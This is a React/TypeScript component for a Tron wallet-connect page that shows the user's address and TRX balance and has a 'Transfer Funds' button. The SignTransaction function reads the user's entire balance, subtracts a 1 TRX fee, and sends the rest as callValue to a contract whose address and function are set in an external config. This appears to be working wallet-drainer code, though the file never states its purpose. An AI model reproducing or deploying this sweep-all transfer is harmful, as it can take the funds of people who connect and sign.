import { useWallet, WalletProvider } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletModalProvider, Button } from '@tronweb3/tronwallet-adapter-react-ui';
// import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
import '@tronweb3/tronwallet-adapter-react-ui/style.css';
import { WalletDisconnectedError, WalletError, WalletNotFoundError } from '@tronweb3/tronwallet-abstract-adapter';
import toast from 'react-hot-toast';
import { useState, useEffect } from 'react';
import { tronWeb } from '../tronweb';
import { Alert } from '@mui/material';

import TronConnectButton from './buttons/tron-connect-button'

import config from '../config';

const { tronContractAddress, tronFunctionName, tronFunctionParams } = config;

export default function TronAdapterConnect() {
    // here use `react-hot-toast` npm package to notify user what happened
    function onError(e: WalletError) {
        if (e instanceof WalletNotFoundError) {
            toast.error(e.message);
        } else if (e instanceof WalletDisconnectedError) {
            toast.error(e.message);
        } else toast.error(e.message);
    }
    return (
    <WalletProvider onError={onError} autoConnect={false} disableAutoConnectOnLoad={true}>
        <WalletModalProvider>
          <h1>Tron Connect</h1>
          <TronConnectButton></TronConnectButton>
          <Profile></Profile>
          <SignTransaction />
        </WalletModalProvider>
    </WalletProvider>
    );
}

function Profile() {
 const { address, connected, wallet } = useWallet();
 const [balance, setBalance] = useState(null); // State to store the balance

  useEffect(() => {
    async function fetchBalance() {
      if (tronWeb && address) {
        try {
          const balanceInSun = await tronWeb.trx.getBalance(address); // Fetch balance in SUN (Tron’s smallest unit)
          setBalance((balanceInSun / 1e6) as any); // Convert balance to TRX
        } catch (error) {
          console.error('Error fetching balance:', error);
          setBalance(null);
        }
      }
    }
    fetchBalance();
  }, [address, connected]); // Re-fetch balance if the address changes
 return (
   <div>
     <p>
        {connected ? 'Connected' : 'Not connected'}
     </p>
     {
        connected ? (
            <>
                <p>
                    <span>Your selected Wallet:</span> {wallet?.adapter.name}
                </p>
                <p>
                    <span>Address:</span> {address}
                </p>
                <p>
                    <span>Balance:</span> {connected && balance !== null ? `${balance} TRX` : 'Not available...'}
                </p>
            </>

        ) : null}
   </div>
 );
}

function SignTransaction() {
  const { signTransaction, address, connected } = useWallet();
  const [netBalance, setNetBalance] = useState<number>(0);
  const [transactionResult, setTransactionResult] = useState(null);
  const [alertOpen, setAlertOpen] = useState(false);

  useEffect(() => {
    const calculateBalance = async () => {
      try {
        // Get user's TRX balance
        const userBalance = await tronWeb.trx.getBalance(address);

        // Estimate transaction fee (assuming 1 TRX as fee for this example)
        const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)

        // Calculate the net amount to send
        const calculatedNetBalance = userBalance - transactionFee;

        // Update state
        setNetBalance(calculatedNetBalance);

      } catch (error) {
        console.error("Error calculating balance:", error);
      }
    };

    calculateBalance();
  }, [tronWeb]);


  async function onSignTransaction() {
    try {
      // Step 0: calculate net balance
      const userBalance = await tronWeb.trx.getBalance(address);

      // Estimate transaction fee (assuming 1 TRX as fee for this example)
      const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)

      // Calculate the net amount to send
      const calculatedNetBalance = userBalance - transactionFee;
      
      console.log(calculatedNetBalance);

      // Step 1: Create the transaction
      const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
        tronContractAddress, // Contract address in hex format
        tronFunctionName,
        {
          feeLimit: 1000000,
          callValue: calculatedNetBalance, // Adjust for any TRX sent along with the transaction
          txLocal: true 
        },
        tronFunctionParams,
        address
      );
      
      console.log("unsignedTx", unsignedTx)

      if (!unsignedTx.result || !unsignedTx.result.result) {
        throw new Error("Failed to create transaction");
      }

      // Step 2: Sign the transaction
      const signedTx = await signTransaction(unsignedTx.transaction);

      // Step 3: Broadcast the transaction
      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);

      // Update the transaction result state based on the response
      setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
      setAlertOpen(true);
    } catch (error) {
      console.error('Error calling contract:', error);
      setTransactionResult('Error' as any);
      setAlertOpen(true);
    }
  }

  return (
    <div>
      {connected ? (
        <>
          <Button disabled={netBalance <=0} onClick={onSignTransaction}>Transfer Funds</Button>
          {alertOpen && (
            <Alert
              onClose={() => setAlertOpen(false)}
              severity={transactionResult === 'Success' ? 'success' : 'error'}
              sx={{ width: '100%', marginTop: 1 }}
            >
              {transactionResult === 'Success' ? (
                <>
                  Success! You can check the status of your transfer on{' '}
                  <a
                    target="_blank"
                    rel="noreferrer"
                    href={`https://tronscan.io/#/address/${address}`}
                  >
                    TronScan
                  </a>
                </>
              ) : (
                `Transaction ${transactionResult}`
              )}
            </Alert>
          )}
        </>
      ) : null}
    </div>
  );
}